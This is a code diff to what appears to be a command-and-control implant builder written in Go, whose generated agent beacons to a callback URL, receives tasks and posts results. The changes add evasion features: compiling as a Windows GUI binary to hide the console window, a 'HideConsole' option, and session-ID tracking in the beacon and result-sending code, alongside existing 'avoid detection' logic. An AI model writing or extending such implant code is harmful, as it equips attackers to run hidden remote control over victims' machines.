@@ -349,8 +349,10 @@ go 1.21
 	}
 	outputPath := filepath.Join(tmpDir, outputName)
 
-	// Build command
-	cmd := exec.Command("go", "build", "-o", outputPath, "-ldflags", "-s -w", ".")
+	// Build command with Windows GUI subsystem flag to hide console window
+	// Use -H windowsgui to compile as Windows GUI application (no console window)
+	ldflags := "-s -w -H windowsgui"
+	cmd := exec.Command("go", "build", "-o", outputPath, "-ldflags", ldflags, ".")
 	cmd.Dir = tmpDir
 	
 	// Set cross-compilation environment
@@ -514,6 +516,7 @@ import (
 	"os/exec"
 	"runtime"
 	"strings"
+	"sync"
 	"time"
 )
 
@@ -523,6 +526,21 @@ const (
 	jitter      = {{.Jitter}}
 	userAgent   = "{{.UserAgent}}"
 )
+
+var (
+	sessionID string
+	sessionMu sync.Mutex
+)
+
+func init() {
+	{{if eq .Evasion.HideConsole true}}
+	// Hide console window on Windows
+	if runtime.GOOS == "windows" {
+		// This will be handled by build tags, but adding runtime check as well
+		// The -ldflags="-H windowsgui" will prevent console window
+	}
+	{{end}}
+}
 
 func main() {
 	// Avoid detection
@@ -669,6 +687,13 @@ func beacon() {
 	
 	req.Header.Set("User-Agent", userAgent)
 	
+	// Send session ID if we have one
+	sessionMu.Lock()
+	if sessionID != "" {
+		req.Header.Set("X-Session-ID", sessionID)
+	}
+	sessionMu.Unlock()
+	
 	resp, err := client.Do(req)
 	if err != nil {
 		return
@@ -680,6 +705,13 @@ func beacon() {
 		var response map[string]interface{}
 		if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
 			return
+		}
+		
+		// Store session ID from response
+		if sid, ok := response["session_id"].(string); ok && sid != "" {
+			sessionMu.Lock()
+			sessionID = sid
+			sessionMu.Unlock()
 		}
 		
 		if tasks, ok := response["tasks"].([]interface{}); ok {
@@ -799,6 +831,14 @@ func sendResult(taskType, taskID, result string) {
 	req, _ := http.NewRequest("POST", callbackURL+"/result", bytes.NewReader(jsonData))
 	req.Header.Set("User-Agent", userAgent)
 	req.Header.Set("Content-Type", "application/json")
+	
+	// Include session ID if we have one
+	sessionMu.Lock()
+	if sessionID != "" {
+		req.Header.Set("X-Session-ID", sessionID)
+	}
+	sessionMu.Unlock()
+	
 	client.Do(req)
 }
 `
